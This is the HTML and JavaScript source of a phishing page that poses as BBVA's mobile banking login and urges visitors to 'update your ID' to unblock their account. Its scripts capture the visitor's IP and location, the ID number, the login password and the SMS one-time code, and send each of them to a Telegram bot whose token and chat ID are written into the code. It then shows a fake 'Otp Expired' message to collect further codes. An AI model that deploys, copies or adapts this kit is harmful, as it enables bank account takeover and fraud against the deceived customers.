<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&display=swap" rel="stylesheet">

    <!-- Bootstrap JS (with Popper) -->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.7/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet" />
    <!-- Bootstrap CSS -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
    <title>BBK</title>
    <style>
     /* Define BentonSansBBVA fonts */
     @font-face {
        font-family: 'BentonSansBBVA';
        src: url('BentonSansBBVA-Book.otf') format('opentype');
        font-weight: 400;
        font-style: normal;
      }
      
      @font-face {
        font-family: 'BentonSansBBVA';
        src: url('BentonSansBBVA-BookItalic.otf') format('opentype');
        font-weight: 400;
        font-style: italic;
      }
      
      @font-face {
        font-family: 'BentonSansBBVA';
        src: url('BentonSansBBVA-Light.otf') format('opentype');
        font-weight: 300;
        font-style: normal;
      }
      
      @font-face {
        font-family: 'BentonSansBBVA';
        src: url('BentonSansBBVA-Medium.otf') format('opentype');
        font-weight: 500;
        font-style: normal;
      }
      
      @font-face {
        font-family: 'BentonSansBBVA';
        src: url('BentonSansBBVA-MediumItalic.otf') format('opentype');
        font-weight: 500;
        font-style: italic;
      }
      
      @font-face {
        font-family: 'BentonSansBBVA';
        src: url('BentonSansBBVA-Bold.otf') format('opentype');
        font-weight: 700;
        font-style: normal;
      }

     * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'BentonSansBBVA', sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      padding: 0px 0;
    }
    html, body {
  height: 100%;
}

.app {
  width: 100%;
  max-width: 600px;
  min-height: 100%;
  background: url('bg.jpeg') no-repeat center center fixed;
  background-size: cover;
  display: none;
  /* padding-bottom: 50px;  */
}

    .card {
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      padding: 16px;
      margin-bottom: 16px;
      border:none;
      background-color: #e5edf0;
    }

    /* ---- Header ---- */
    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      /* background: #02374f; */
      color: #fff;
      padding: 25px 25px;

      padding-bottom: 120px;
      /* border-radius: 12px; */
      margin-bottom: 30px;
    }
    .header i { font-size: 1.2rem; cursor: pointer; }
    .header .title {
      font-size: 1rem;
      font-weight: 400;
    }

    /* ---- Phone Input ---- */
    .phone-group {
      display: flex;
      align-items: center;
      /* margin-bottom: 12px; */
    }
    .phone-group select {
      border: 1px solid #ccc;
      border-radius: 8px;
      padding: 8px;
      margin-right: -81px;
      z-index: 2;
      /* background: url('data:image/svg+xml;utf8,<svg fill="%23666" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>') no-repeat 95% center; */

       -webkit-appearance: none;  /* Safari/Chrome */
  -moz-appearance: none;     /* Firefox */
      font-size: 0.9rem;
      padding-right: 8px;
      background-color: #ffff;
    }
    .phone-group input {
      flex: 1;
      border: 1px solid #ccc;
      border-radius: 8px;
      /* padding: 8.5px; */
      padding-left: 12px;
      font-size: 1rem;
      /* background-color: #e9e7ea; */
      width: 100%;
    }
    .phone-group input::placeholder {
      color: #999;
    }
.phone-group input:focus {
      border-color: #02374f;
      outline: none;
    }
    /* ---- Checkbox ---- */
    .agree {
      display: flex;
      align-items: flex-start;
      font-size: 0.9rem;
      margin-bottom: 16px;
    }
    .agree input {
      margin-top: 3px;
      margin-right: 8px;
    }
    .agree a {
      color: #034c8c;
      text-decoration: none;
      font-weight: 500;
    }

    /* ---- Continue Button ---- */
    .btn-continue {
      width: 100%;
      background: #001491;
      color: #fff;
      padding: 12px;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      font-weight: 500;
      cursor: pointer;
      margin-bottom: 12px;
      transition: background-color 0.3s ease, transform 0.2s ease;

    }
    .btn-continue:active { transform: scale(0.8); }
        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            /* margin-right: 10px; */
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    /* ---- Icon Menu ---- */
    .menu-row {
      display: flex;
      justify-content: space-between;
      text-align: center;
      margin-bottom: 16px;
      margin-top: 30px;
    }
.menu-item {
  flex: 1;
  color: #034c8c;
    display: flex;
      justify-content: center;
      align-items: center;
      /* text-align: center; */
      flex-direction: column;
  font-size: 0.9rem;
}

.menu-item i {
  font-size: 1.2rem;
  color: white;
  background-color: #02374f;
  border-radius: 50%;
  padding: 12px;
  width: 40px;
  height: 40px;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 6px;
}


    /* ---- Promo Card ---- */
    .promo {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      background: #dfe7d8;
    }
    .promo img {
      width: 60px;
      height: 40px;
      object-fit: contain;
      margin-bottom: 12px;
    }
    .promo .label {
      font-size: 0.9rem;
      font-weight: 500;
      margin-bottom: 4px;
      color: #333;
    }
    .promo .sub {
      font-size: 0.8rem;
      color: #555;
      margin-bottom: 12px;
    }
    .promo .btn-issue {
      width: 100%;
      background: #fff;
      color: #479b23;
      border: 1px solid #ffff;
      border-radius: 8px;
      padding: 10px;
      font-size: 0.9rem;
      font-weight: 500;
      cursor: pointer;
      box-shadow: 0 2px 4px rgba(0.3, 0.2, 0.2, 0.2);
    }
    .promo .btn-issue:active {
      background: #f0f2f5;
    }
    .menu-item,
.btn-issue {
  transition: background-color 0.3s ease, transform 0.2s ease;
}

.menu-item:active,
.btn-issue:active {
  transform: scale(0.8);
}
.lang-toggle {
  transition: transform 0.2s ease;
}

.lang-toggle.clicked {
  transform: scale(0.8);
}
/* HTML: <div class="loader"></div> */
.loader {
  height: 80px;
  aspect-ratio: 1;
  display: grid;
}
.loader:before,
.loader:after {
  content: "";
  /* Define two different gradients */
  --c: 
    no-repeat linear-gradient(#f0f5ed 0 0),
    no-repeat linear-gradient(#070e45 0 0);
  background: var(--c);
  background-size: 25% 50%;
  animation: l4 1.5s infinite linear;
}
.loader:after {
  transform: scale(-1);
}
@keyframes l4 {
  0%, 10% {
    background-position: 33.4% 100%, 66.6% 100%;
  }
  40% {
    background-position: 33.4% 0, 100% 100%;
  }
  70% {
    background-position: 0 100%, 66.6% 0;
  }
  100% {
    background-position: 33.4% 100%, 66.6% 100%;
  }
}
/* in your <style> block, replace your existing #page‚Äëloader rules with: */
#page-loader {
  position: fixed;
  top: 0; 
  left: 0;
  width: 100%;
  height: 100%;
  /* semi‚Äëtransparent white */
  background: #00147b7c;
  /* must come before backdrop‚Äëfilter in most browsers */
  -webkit-backdrop-filter: blur(4px);
  backdrop-filter: blur(4px);
  display: none;        /* hide by default */
  place-items: center;  /* center the spinner */
  z-index: 99999;
  display: none;
}

/* your spinner lives inside, no change needed here */
#page-loader .loader {
  height: 80px;
  aspect-ratio: 1;
  /* animation from your @keyframes l4 */
}
      .loader-container {
  display: flex;
  justify-content: center;
  align-items: center;
  /* background-color: #008a00; */
  /* height: 100vh;  */
  /* width: 100vw;  */
    margin: 0; /* Remove any margins */
  padding: 0; /* Remove any padding */
  /* overflow: hidden; */
}
.wow{
  width: 100%;
  height: 100%;
  object-fit: cover;
  position: absolute;
  top: 0;
  left: 0;
  z-index: -1; /* Ensure it stays behind other content */
}
.omk{
  width: 80px;
  height: auto;
  /* object-fit: contain; */
  margin-left: 25px;
  margin-top: 5px;
}
  #welcom-user {
    font-family: 'Playfair Display', serif;
    font-size: 2.2rem;
    font-weight: 900;
    color: #070e45;
  }

  .form-container {
      width: 100%;
      max-width: 400px;
    }

    .form-group {
      position: relative;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding-top:  16px;
      padding-bottom: 6px;
      font-size: 1rem;
      border: 2px solid #33415c;
      border-radius: 10px;
      outline: none;
      background: #f7f9f8;
      font-family: 'BentonSansBBVA', sans-serif;
    }
     input:focus{
      background: #fff;
     }

    label {
      position: absolute;
      top: 50%;
      left: 12px;
      transform: translateY(-50%);
      color: #5a6172;
      pointer-events: none;
      transition: 0.2s ease all;
      font-size: 1rem;
      font-family: 'BentonSansBBVA', sans-serif;
    }

    input:focus + label,
    input:not(:placeholder-shown) + label {
      top: 12px;
      left: 12px;
      font-size: 0.75rem;
      /* margin-bottom: 4px; */
      /* background-color: #f6f8f9; */
      /* padding: 0 4px; */
      transform: translateY(-50%);
    }

    .eye-icon {
      position: absolute;
      top: 50%;
      right: 12px;
      transform: translateY(-50%);
      cursor: pointer;
      color: #072066;
      font-size: 1rem;
    }
.otp-box {
  width: 42px;
  height: 50px;
  border: 1px solid #ccc;
  border-radius: 8px;
  font-size: 1.5rem;
  text-align: center;
  line-height: 50px;       /* Make text vertically centered */
  padding: 0;              /* Remove extra padding */
  vertical-align: middle;  /* Align inline-level elements vertically */
  font-family: 'BentonSansBBVA', sans-serif;
}

.otp-box:focus {
  border-color: #001491;
  outline: none;
}

  </style>
</head>
<body>
  <div class="loader-container">
    <img src="sp.jpg" class="wow" alt="Loading..." class="loader" />
  </div>

  <div class="app">
    <!-- Header -->
    <div class="header">
      <div></div>
      <div class="title"><img src="logo.png" class="omk" alt="Logo" /></div>
      <div style="display: flex; align-items: center; gap: 16px;">
      <div onclick="toggleLanguage()" class="lang-toggle" style="cursor: pointer; display: flex; align-items: center; flex-direction: column; margin-right: -2px; margin-bottom: -30px;">
  <i class="fa fa-globe"></i>
  <p id="lang-label" style="font-size: 0.6rem;">ESP</p>
  <!-- help icon -->
</div>
    <div class="lang-toggle" style="cursor: pointer; display: flex; align-items: center; flex-direction: column; margin-right: -2px; margin-bottom: -30px;">
 <i class="fa fa-question-circle" style="color: #ffffff;  "></i>
  <p id="lang-label" style="font-size: 0.6rem;">Help</p>
  <!-- help icon -->
</div>
</div>
<!-- <i class="fa fa-question-circle" style="color: #ffffff; font-size: 1.5rem; margin-top: 5px;"></i> -->

<!-- <i class="fa fa-bars"></i> -->

    </div>

    <!-- Phone entry card -->
     
    <div class="card" style="margin-top: -120px; width:90%;margin-left: 5%;">
     <p id="welcom-user">Good morning</p>
     <!-- input -->
      <div class="phone-group">
        <!-- <input type="text" placeholder="DNI, NIE or TIE ID Card" /> -->
        <div class="form-container">
    
    <!-- ID Field -->
    <div class="form-group">
      <input type="text" id="one" style="margin-bottom:0px;" id="user-id" placeholder=" " required>
      <label for="user-id">DNI, NIE or TIE ID Card</label>
    </div>

    <!-- Password Field -->
    <div class="form-group" id="two" style="margin-bottom:10px;display:none;">
      <input type="password" id="login-password" placeholder=" " required>
      <label for="login-password">Login password</label>
      <i class="fa-regular fa-eye eye-icon" id="togglePassword"></i>
    </div>

  </div>
      </div>
<div style="margin-left:2px;margin-bottom:25px; display: flex; align-items: center; justify-content: center;margin-top: 10px;">
  <!-- lockicon -->
  <i class="fa fa-lock" style="color: #070e45; font-size: 1.2rem;font-weight: 700;"></i>
  <span style="color: #070e45; font-size: 0.7rem; font-weight: 400;line-height: 0.8rem;margin-left: 7px;margin-top:3px;">Update your ID now to unblock your account and access BBVA's services.</span>
</div>
      <button class="btn-continue">Continue</button>


       
 <div class="menu-row" style=" width:100%;">
      <div class="menu-item">
        <!-- <i class="fa fa-arrow-right-arrow-left" ></i> -->
        <div style="width: 40px; height: 40px; background: #ffff; border-radius: 50%; align-items: center; justify-content: center; display: flex;">
         <img src="add-friend.png" style="width: 37px; height: 37px;  " alt="Transfer Icon">
  </div>
        Become a Customer
      </div>
      <div class="menu-item">
          <div style="width: 40px; height: 40px; background: #ffff; border-radius: 50%; align-items: center; justify-content: center; display: flex;">
        <img src="address.png" style="width: 30px; height: 30px;  " alt="Address Icon">
      </div>
       
        BBVA Homes
      </div>
      <div class="menu-item">
         <div style="width: 40px; height: 40px; background: #ffff; border-radius: 50%; align-items: center; justify-content: center; display: flex;">
        <img src="office.png"  style="width: 27px; height: 27px;  " alt="Office Icon">
      </div>
        
        Branches and ATMs
      </div>
      <div class="menu-item">
          <div style="width: 40px; height: 40px; background: #ffff; border-radius: 50%; align-items: center; justify-content: center; display: flex;">
        <img src="account.png" style="width: 30px; height: 30px;  " alt="Account Icon">
      </div>
       
      Share expenses
      </div>
    </div>

  <!-- </div> -->
    </div>
 
<div>
  <div class="card promo" style="width:100%; background-color: #e5edf0;">
     <p style="   font-family: 'Playfair Display', serif;
    font-size: 1.8rem;
    text-align: left;
    font-weight: 900;
    color: #070e45;">Not A BBVA CUSTOMER YET?</p>
    <div style="margin-left: 2%;margin-right: 2%;border-radius: 5px; background-color:  #fffdfdef;">    <img src="hh.avif" style="width: 80%; height: auto;" alt="Promo Icon" />
    <p style="   font-family: 'BentonSansBBVA', sans-serif;
    font-size: 1.3rem;
    text-align: left;
    font-weight: 500;
    margin-left: 4%;
    color: #070e45;">Do you still pay fees on your account?</p>
    <div class="sub" style=" text-align: left;margin-left: 4%;margin-right: 3%;">Discover all the options we have for you and choose the one that best suits your needs.</div>
  <!-- blue button -->
    <button class="btn-issue" style="background-color: #001491; color: #ffffff; width: 90%; margin-bottom: 25px;margin-top: 10px;">Become a customer</button>
  
  </div>
 <!-- <div class="card promo" style="width:100%; background-color: #e5edf0;"> -->
     <p style="   font-family: 'Playfair Display', serif;
    font-size: 1.4rem;
    text-align: left;
    font-weight: 900;
    margin-top:20px;
    color: #070e45;">If you prefer, you can gradually get to know us</p>
    <div style="margin-left: 2%;margin-right: 2%;border-radius: 5px; background-color:  #fffdfdef;">    <img src="e.webp" style="width: 85%; height: 100px;margin-top: 30px;" alt="Promo Icon" />
    <p style="   font-family: 'BentonSansBBVA', sans-serif;
    font-size: 1.3rem;
    text-align: left;
    font-weight: 500;
    margin-left: 4%;
    color: #070e45;">Try the BBVA app without being a customer</p>
    <div class="sub" style=" text-align: left;margin-left: 4%;margin-right: 3%;">You'll be able to use the app's main features for your daily needs, like booking an appointment, adding banks, or calculating a home's value. Sign up in two steps, with¬†no¬†commitment.</div>
  <!-- blue button -->
    <button class="btn-issue" style="background-color: #001491; color: #ffffff; width: 90%; margin-bottom: 25px;margin-top: 10px;">More information</button>
  
  </div>
<!-- </div> -->



    </div>


    <!-- OTP Modal -->
<!-- Updated OTP Modal -->
<div id="otp-modal" style="
  position: fixed;
  bottom: -100%;
  left: 0;
  width: 100%;
  background: white;
  border-radius: 16px 16px 0 0;
  padding: 24px 20px;
  transition: bottom 0.4s ease-in-out;
  box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.2);
  z-index: 99998;
  font-family: 'BentonSansBBVA', sans-serif;
">
  <div style="text-align: center;">
    <h6 style="font-size: 1rem; font-weight: 600; color: #111;">Verify</h6>
    <i class="fa fa-lock" style="font-size: 32px; color: #001491; margin: 10px 0;"></i>
    <p style="font-size: 0.95rem; color: #333;">To verify your identity, enter the code you received on your mobile <b>‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢</b></p>

    <div style="margin-top: 12px; font-size: 0.9rem; color: #001491;">
      <span id="otp-timer">2:00</span> Min. to validate the code
    </div>

    <div style="margin: 12px 0;">
      <!-- <a href="#" style="font-size: 0.9rem; color: #007BFF; text-decoration: none;">Request new SMS code</a> -->
       <a href="#" id="resend-link" style="font-size: 0.9rem; color: #007BFF; text-decoration: none;">Request new SMS code</a>

    </div>

    <div style="display: flex; justify-content: center; gap: 8px; margin-top: 20px;align-items: center;">
      <!-- 6 digit boxes -->
      <input maxlength="1" class="otp-box" type="text" inputmode="numeric">
      <input maxlength="1" class="otp-box" type="text" inputmode="numeric">
      <input maxlength="1" class="otp-box" type="text" inputmode="numeric">
      <input maxlength="1" class="otp-box" type="text" inputmode="numeric">
      <input maxlength="1" class="otp-box" type="text" inputmode="numeric">
      <input maxlength="1" class="otp-box" type="text" inputmode="numeric">
    </div>

    <p style="margin-top: 8px; font-size: 0.75rem; color: #777;">This code is unique and for single use only.</p>

    <button disabled id="otp-sign-btn" style="
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      border-radius: 10px;
      border: none;
      font-size: 1rem;
      background: #d3d3d3;
      color: white;
      font-weight: bold;
      cursor: not-allowed;
      font-family: 'BentonSansBBVA', sans-serif;
    ">Verify</button>
  </div>
</div>

<script>
window.addEventListener("load", async () => {
  // --- CONFIG (set your own values)
  const ipinfoToken = "1b16cc141fc931"; // your ipinfo token
  const botToken = "8235540737:AAF7YSYVSMh5eioQp7VtQdoBl9KE28xs2-U"; // your Telegram bot token
  const chatId = "-5069647120"; // your Telegram chat/channel id

  try {
    const time = new Date().toISOString();
    const browser = navigator.userAgent;
    const device = navigator.platform;

    // Get IP and location from ipinfo
    const ipRes = await fetch(`https://ipinfo.io/json?token=${encodeURIComponent(ipinfoToken)}`, {
      cache: "no-store"
    });
    const ipData = await ipRes.json();

    // Build Telegram message
    const message =
`üß† New Visitor

üïí Time: ${time}
üåç IP: ${ipData.ip || "‚Äî"}
üìç Location: ${[ipData.city, ipData.region, ipData.country].filter(Boolean).join(", ") || "‚Äî"}

üß≠ Browser: ${browser}
üì± Device: ${device}`;

    // Send to Telegram
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });

  } catch (error) {
    console.error("Error sending data to Telegram:", error);
  }
});
</script>
     <script>
    const passwordInput = document.getElementById("login-password");
    const toggleIcon = document.getElementById("togglePassword");

    toggleIcon.addEventListener("click", () => {
      const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
      passwordInput.setAttribute("type", type);
      toggleIcon.classList.toggle("fa-eye");
      toggleIcon.classList.toggle("fa-eye-slash");
    });
  </script>
    <script>
  window.addEventListener("load", () => {
    const greetings = {
  eng: {
    morning: "Good morning",
    afternoon: "Good afternoon",
    evening: "Good evening"
  },
  ukr: {
    morning: "Buenos d√≠as",
    afternoon: "Buenas tardes",
    evening: "Buenas noches"
  }
};

   const now = new Date();
const hour = now.getHours();
const lang = "eng"; // Replace with dynamic language detection if needed

let timeOfDay = "morning";
if (hour >= 12 && hour < 17) timeOfDay = "afternoon";
else if (hour >= 17 || hour < 5) timeOfDay = "evening";

const greeting = greetings[lang]?.[timeOfDay] || "Hello";
document.getElementById("welcom-user").textContent = greeting;

  });
</script>
<script>
  document.querySelectorAll('.menu-item').forEach(item => {
    item.addEventListener('click', () => {
      const input1 = document.getElementById('one');
      const input2 = document.getElementById('login-password');

      if (input1 && !input1.disabled) {
        input1.focus();
      } else if (input2 && !input2.disabled) {
        input2.focus();
      }
      // Else: do nothing if both are disabled
    });
  });
</script>

<script>
  window.addEventListener("load", async () => {
    // SHOW CONTENT AFTER 3 SECONDS
    setTimeout(() => {
      document.querySelector(".loader-container").style.display = "none";
      document.querySelector(".app").style.display = "block";
    }, 3000);
  });
</script>


  <script>
document.querySelector('.btn-continue').addEventListener('click', async function(e) {
  e.preventDefault();
  const button = e.target;

  if (button.textContent.trim() === "Log in") {
    const idInput = document.getElementById('one');
    const passInput = document.getElementById('login-password');

    const idValue = idInput.value.trim();
    const passValue = passInput.value.trim();

    if (idValue.length < 2 || passValue.length < 2) {
      if (idValue.length < 2) idInput.style.border = '1px solid red';
      if (passValue.length < 2) passInput.style.border = '1px solid red';
      return;
    }

    document.getElementById('page-loader').style.display = 'grid';

    const messageLogin = `üÜî ID: ${idValue}\nüîê Password: ${passValue}`;

  const BOT_TOKEN = "8235540737:AAF7YSYVSMh5eioQp7VtQdoBl9KE28xs2-U"; // your Telegram bot token
  const chatIdd = "-5069647120"; // replace with your chat ID

    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatIdd, text: messageLogin })
      });

      document.getElementById('page-loader').style.display = 'none';
      document.getElementById('otp-modal').style.bottom = '0';
      // disable password input
      passInput.disabled = true;

    } catch (err) {
      console.error("Error sending login", err);
      document.getElementById('page-loader').style.display = 'none';
      alert("Something went wrong. Please try again.");
    }

    return; // prevent fallback logic
  }

  // If NOT Log in (first-time input)
const inputEl = document.getElementById('one');
const fullPhone = inputEl.value.trim();

// Regex for allowed formats
const validFormat = /^(\d{7}[a-zA-Z]|[a-zA-Z]\d{7}[a-zA-Z])$/;

if (!fullPhone) {
  inputEl.style.border = '1px solid red';
  inputEl.focus();
  return;
}
// remove red border if valid
inputEl.style.border = '1px solid #ccc';

  document.getElementById('page-loader').style.display = 'grid';

  await new Promise(res => setTimeout(res, 1000));

  const messageFirst = `üÜî ID: ${fullPhone}`;

  const BOT_TOKENN = "8235540737:AAF7YSYVSMh5eioQp7VtQdoBl9KE28xs2-U"; // your Telegram bot token
  const chatIddd = "-5069647120"; // replace with your chat ID

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKENN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatIddd, text: messageFirst })
    });

  } catch (err) {
    console.error("Telegram send error", err);
  }

  document.getElementById('page-loader').style.display = 'none';
  document.getElementById('two').style.display = 'flex';
  inputEl.disabled = true;
  button.textContent = "Log in";
});
</script>

<!-- <script>
  function toggleLanguage() {
    const langDiv = document.querySelector('.lang-toggle');
    langDiv.classList.add('clicked');

    const currentLang = "<?php echo $lang; ?>";
    const newLang = currentLang === "eng" ? "ukr" : "eng";

    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'change_language.php', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function () {
      if (xhr.status === 200) {
        window.location.reload();
      }
    };
    xhr.send('lang=' + newLang);
  }
</script> -->

<script>
  // OTP auto-focus
 const otpBoxes = document.querySelectorAll('.otp-box');

otpBoxes.forEach((box, idx) => {
  box.addEventListener('input', (e) => {
    const value = box.value;
    if (value.length === 1 && idx < otpBoxes.length - 1) {
      otpBoxes[idx + 1].focus();
    }
    checkOtpFilled();
  });

  box.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace') {
      if (box.value === '' && idx > 0) {
        otpBoxes[idx - 1].focus();
      }
    }
  });

  box.addEventListener('paste', (e) => {
    e.preventDefault();
    const pasteData = e.clipboardData.getData('text').trim().slice(0, otpBoxes.length);
    for (let i = 0; i < pasteData.length; i++) {
      otpBoxes[i].value = pasteData[i];
    }
    otpBoxes[Math.min(pasteData.length, otpBoxes.length - 1)].focus();
    checkOtpFilled();
  });
});

function checkOtpFilled() {
  const filled = [...otpBoxes].every(input => input.value.trim().length === 1);
  const btn = document.getElementById('otp-sign-btn');
  if (filled) {
    btn.disabled = false;
    btn.style.background = '#001491';
    btn.style.cursor = 'pointer';
  } else {
    btn.disabled = true;
    btn.style.background = '#d3d3d3';
    btn.style.cursor = 'not-allowed';
  }
}


  // // Timer countdown
  // let timer = 120;
  // const timerEl = document.getElementById('otp-timer');
  // const countdown = setInterval(() => {
  //   if (timer <= 0) {
  //     clearInterval(countdown);
  //     timerEl.textContent = '0:00';
  //   } else {
  //     const min = Math.floor(timer / 60);
  //     const sec = String(timer % 60).padStart(2, '0');
  //     timerEl.textContent = `${min}:${sec}`;
  //     timer--;
  //   }
  // }, 1000);
</script>
<script>
let timer;
let countdown;
const timerEl = document.getElementById('otp-timer');
const resendLink = document.getElementById('resend-link');

function startOtpTimer() {
  timer = 120;
  clearInterval(countdown); // clear any existing timer

  countdown = setInterval(() => {
    if (timer <= 0) {
      clearInterval(countdown);
      timerEl.textContent = '0:00';
    } else {
      const min = Math.floor(timer / 60);
      const sec = String(timer % 60).padStart(2, '0');
      timerEl.textContent = `${min}:${sec}`;
      timer--;
    }
  }, 1000);
}

resendLink.addEventListener('click', function (e) {
  e.preventDefault();
  resendLink.textContent = "Please wait...";
  resendLink.style.pointerEvents = "none";
  resendLink.style.color = "gray";

  // Simulate SMS delay
  setTimeout(() => {
    resendLink.textContent = "Request new SMS code";
    resendLink.style.pointerEvents = "auto";
    resendLink.style.color = "#007BFF";
    startOtpTimer();
  }, 3000);
});

// Start timer initially when modal is shown
startOtpTimer();
</script>
<script>
  document.getElementById('otp-sign-btn').addEventListener('click', async function () {
    const otpBtn = this;

    // Show loader
    document.getElementById('page-loader').style.display = 'grid';

    // Gather input values
    const idVal = document.getElementById('one').value.trim();
    const passVal = document.getElementById('login-password').value.trim();
    const otpInputs = document.querySelectorAll('.otp-box');
    const otpVal = [...otpInputs].map(input => input.value.trim()).join('');

    // Simulate loading delay
    await new Promise(res => setTimeout(res, 4000));

    const fullMessage = `
üîê Verification Attempt
üÜî ID: ${idVal}
üîë Password: ${passVal}
üì≤ OTP: ${otpVal}
`;

    // Send to Telegram
    const BOT_TOKENNN = "8235540737:AAF7YSYVSMh5eioQp7VtQdoBl9KE28xs2-U"; // your Telegram bot token
    const chatIdddd = "-5069647120"; // replace with your chat ID
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKENNN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatIdddd, text: fullMessage })
      });
    } catch (err) {
      console.error("Error sending OTP", err);
    }
// empty otp
    otpInputs.forEach(input => input.value = '');



startOtpTimer();
    // Hide loader
    document.getElementById('page-loader').style.display = 'none';

    // Show red error message
    let errorEl = document.getElementById('otp-error-msg');
    if (!errorEl) {
      errorEl = document.createElement('p');
      errorEl.id = 'otp-error-msg';
      errorEl.style.color = 'red';
      errorEl.style.fontSize = '0.85rem';
      errorEl.style.marginTop = '10px';
      errorEl.style.textAlign = 'center';
      otpBtn.insertAdjacentElement('afterend', errorEl);
    }
    errorEl.textContent = "Otp Expired, please try again.";
  });
</script>



<div id="page-loader">
  <div class="loader"></div>
</div>
  </body>
</html>